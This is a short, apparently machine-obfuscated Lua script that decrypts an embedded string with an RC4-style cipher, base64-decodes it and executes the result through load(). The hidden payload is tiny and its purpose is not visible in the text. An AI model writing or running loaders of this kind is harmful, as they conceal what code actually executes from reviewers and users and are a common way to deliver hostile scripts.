local kh26KOld = "\183\116\149\032\047\138\113\042\088\048\195\100\185\015\048\234\166\068\227\017\074\083\148\163\247\180\173\203\230\139\223\224\208\022\082\099"
local K8VnUmEq = "gLkWVY7sA3zuQjRj"
local function eNsxFzYx(a,b) local p,c=1,0; while a>0 and b>0 do local ra,rb=a%2,b%2; if ra~=rb then c=c+p end; a,b,p=(a-ra)/2,(b-rb)/2,p*2; end; if a<b then a=b end; while a>0 do local ra=a%2; if ra>0 then c=c+p end; a,p=(a-ra)/2,p*2; end; return c; end
local function wwbyClse(d,k)
    local s = {} for i=0,255 do s[i]=i end
    local j=0
    for i=0,255 do
        j=(j+s[i]+string.byte(k,(i%#k)+1))%256
        s[i],s[j]=s[j],s[i]
    end
    local i,out = 0,{}
    j=0
    for idx=1,#d do
        i=(i+1)%256
        j=(j+s[i])%256
        s[i],s[j]=s[j],s[i]
        out[#out+1]=string.char(eNsxFzYx(string.byte(d,idx),s[(s[i]+s[j])%256]))
    end
    return table.concat(out)
end
local function qrF9taWi(data)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        local r=0
        for i=1,8 do r=r+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(r)
    end))
end
local ok, err = pcall(function()
    local res = wwbyClse(kh26KOld, K8VnUmEq)
    assert(load(qrF9taWi(res)))()
end)
if not ok then print("SecureError: "..tostring(err)) end